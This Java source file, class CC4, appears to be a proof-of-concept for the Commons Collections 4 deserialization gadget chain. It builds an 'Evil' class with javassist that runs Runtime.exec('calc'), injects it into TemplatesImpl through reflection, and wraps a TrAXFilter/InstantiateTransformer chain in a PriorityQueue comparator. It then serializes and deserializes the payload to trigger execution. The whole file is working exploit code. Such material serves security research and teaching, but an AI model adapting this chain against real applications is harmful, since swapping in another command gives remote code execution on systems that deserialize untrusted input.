package com.example;
import com.sun.org.apache.xalan.internal.xsltc.DOM;
import com.sun.org.apache.xalan.internal.xsltc.TransletException;
import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;
import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;
import javax.xml.transform.Templates;
import com.sun.org.apache.xalan.internal.xsltc.trax.TrAXFilter;
import javassist.ClassClassPath;    
import javassist.ClassPool;
import javassist.CtClass;
import org.apache.commons.collections4.comparators.TransformingComparator;
import org.apache.commons.collections4.functors.ConstantTransformer;
import org.apache.commons.collections4.functors.InstantiateTransformer;
import org.apache.commons.collections4.Transformer;
import org.apache.commons.collections4.functors.ChainedTransformer;
import java.io.*;
import java.lang.reflect.Field;
import java.util.PriorityQueue;




public class CC4 {
    public static void main(String[] args) throws Exception {
        ClassPool pool=ClassPool.getDefault();
        pool.insertClassPath(new ClassClassPath(AbstractTranslet.class));
        CtClass cc=pool.makeClass("Evil");
        String cmd="java.lang.Runtime.getRuntime().exec(\"calc\");";
        cc.makeClassInitializer().insertBefore(cmd);
        cc.setSuperclass(pool.get(AbstractTranslet.class.getName()));
        String rename="Evil"+System.nanoTime();
        cc.setName(rename);
        byte[] bytes=cc.toBytecode();
        byte[][] target=new byte[][]{bytes};

        TemplatesImpl templates=new TemplatesImpl();
        Field name=TemplatesImpl.class.getDeclaredField("_name");
        name.setAccessible(true);
        name.set(templates, "test");
        Field bytecodes=TemplatesImpl.class.getDeclaredField("_bytecodes");
        bytecodes.setAccessible(true);
        bytecodes.set(templates, target);
        Field tfactory=TemplatesImpl.class.getDeclaredField("_tfactory");
        tfactory.setAccessible(true);

        ConstantTransformer ct=new ConstantTransformer(TrAXFilter.class);
        InstantiateTransformer it=new InstantiateTransformer(new Class[]{Templates.class}, new Object[]{templates});
        ChainedTransformer chain=new ChainedTransformer(new Transformer[]{ct,it});

        TransformingComparator c1=new TransformingComparator<>(new ConstantTransformer(1));
        TransformingComparator comparator=new TransformingComparator<>(chain);

        PriorityQueue pq=new PriorityQueue<>(c1);
        pq.add(1);
        pq.add(2);
        Field f=PriorityQueue.class.getDeclaredField("comparator");
        f.setAccessible(true);
        f.set(pq, comparator);

        ByteArrayOutputStream baos=new ByteArrayOutputStream();
        ObjectOutputStream oos=new ObjectOutputStream(baos);
        oos.writeObject(pq);
        oos.close();
        byte[] payload=baos.toByteArray();
        

        ByteArrayInputStream bais=new ByteArrayInputStream(payload);
        ObjectInputStream ois=new ObjectInputStream(bais);
        ois.readObject();
        ois.close();
        System.out.println("Payload executed successfully!");



    }
}